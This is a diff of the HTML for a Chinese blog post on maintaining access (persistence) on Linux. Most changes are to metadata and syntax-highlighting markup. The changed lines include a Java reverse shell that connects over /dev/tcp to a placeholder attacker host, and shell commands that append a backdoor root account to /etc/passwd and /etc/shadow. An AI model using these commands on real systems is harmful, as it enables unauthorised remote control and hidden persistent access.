@@ -11,11 +11,13 @@
 <meta property="og:url" content="https://www.v4ler1an.com/2020/12/backdoor/" /><meta property="og:image" content="https://www.v4ler1an.com/images/personal_logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-12-04T21:57:40+08:00" />
 <meta property="article:modified_time" content="2020-12-05T16:45:40+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://www.v4ler1an.com/images/personal_logo.png"/>
 
 <meta name="twitter:title" content="Linux 下的权限维持"/>
 <meta name="twitter:description" content="Linux 下的权限维持"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
 <meta name="application-name" content="V4ler1an">
 <meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -28,7 +30,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/www.v4ler1an.com\/2020\/12\/backdoor\/"
-        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "Linux","wordcount":  5380 ,
+        },"image": ["https:\/\/www.v4ler1an.com\/images\/personal_logo.png"],"genre": "posts","keywords": "Linux","wordcount":  5317 ,
         "url": "https:\/\/www.v4ler1an.com\/2020\/12\/backdoor\/","datePublished": "2020-12-04T21:57:40+08:00","dateModified": "2020-12-05T16:45:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
@@ -123,7 +125,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">Linux 下的权限维持</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>有毒</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/misc/"><i class="far fa-folder fa-fw"></i>Misc</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-12-04">2020-12-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5380 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-12-04">2020-12-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5317 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 11 分钟&nbsp;<span id="/2020/12/backdoor/" class="leancloud_visitors" data-flag-title="Linux 下的权限维持">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                     </span>&nbsp;</div>
@@ -402,20 +404,20 @@
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Revs</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    <span class="cm">/**
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Revs</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="cm">/**
 </span></span></span><span class="line"><span class="cl"><span class="cm">    * @param args
 </span></span></span><span class="line"><span class="cl"><span class="cm">    * @throws Exception 
-</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
-</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">        <span class="c1">// TODO Auto-generated method stub
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">cmd</span><span class="o">[]=</span> <span class="o">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="o">,</span><span class="s">&#34;-c&#34;</span><span class="o">,</span><span class="s">&#34;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="o">};</span>
-</span></span><span class="line"><span class="cl">        <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
-</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
-</span></span><span class="line"><span class="cl">    <span class="o">}</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// TODO Auto-generated method stub</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">[]=</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="s">&#34;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">p</span><span class="p">.</span><span class="na">waitFor</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h5 id="6-lua">6. Lua</h5>
 <div class="highlight"><div class="chroma">
@@ -557,7 +559,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an❌0:0::/:/bin/sh&#34;</span> &gt;&gt; /etc/passwd
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an:x:0:0::/:/bin/sh&#34;</span> &gt;&gt; /etc/passwd
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>如果目标系统不允许uid=0的用户远程登录，可以增加一个普通用户账号：</p>
@@ -566,7 +568,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an:👎-1👎-1👎-1:500&#34;</span> &gt;&gt; /etc/shadow
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;v4ler1an::-1:-1:-1:-1:-1:-1:500&#34;</span> &gt;&gt; /etc/shadow
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>有些情况下添加不成功可能是因为密码强度不够，可以适当增加密码强度。</p>
